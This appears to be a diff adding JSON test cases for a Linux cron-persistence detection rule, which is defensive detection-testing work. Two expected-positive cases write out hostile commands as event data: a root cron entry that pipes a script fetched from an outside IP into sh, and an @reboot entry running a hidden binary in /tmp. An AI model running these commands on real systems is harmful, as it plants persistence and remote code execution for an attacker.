@@ -1,0 +1,41 @@
+{
+  "rule": "rules/linux/cron_persistence.yml",
+  "cases": [
+    {
+      "name": "cron entry fetching a payload",
+      "expect": true,
+      "event": {
+        "CommandLine": "echo '* * * * * root curl -s http://203.0.113.44/p.sh | sh' > /etc/cron.d/apache-maint",
+        "exe": "/usr/bin/bash",
+        "user": "root"
+      }
+    },
+    {
+      "name": "cron running a binary from /tmp",
+      "expect": true,
+      "event": {
+        "CommandLine": "echo '@reboot /tmp/.x/update' >> /var/spool/cron/crontabs/root",
+        "exe": "/usr/bin/bash",
+        "user": "root"
+      }
+    },
+    {
+      "name": "normal logrotate cron entry",
+      "expect": false,
+      "event": {
+        "CommandLine": "cp /opt/app/cron/logrotate /etc/cron.d/logrotate",
+        "exe": "/usr/bin/cp",
+        "user": "root"
+      }
+    },
+    {
+      "name": "download with no cron involvement",
+      "expect": false,
+      "event": {
+        "CommandLine": "curl -o /tmp/pkg.tar.gz https://mirror.internal/pkg.tar.gz",
+        "exe": "/usr/bin/curl",
+        "user": "deploy"
+      }
+    }
+  ]
+}
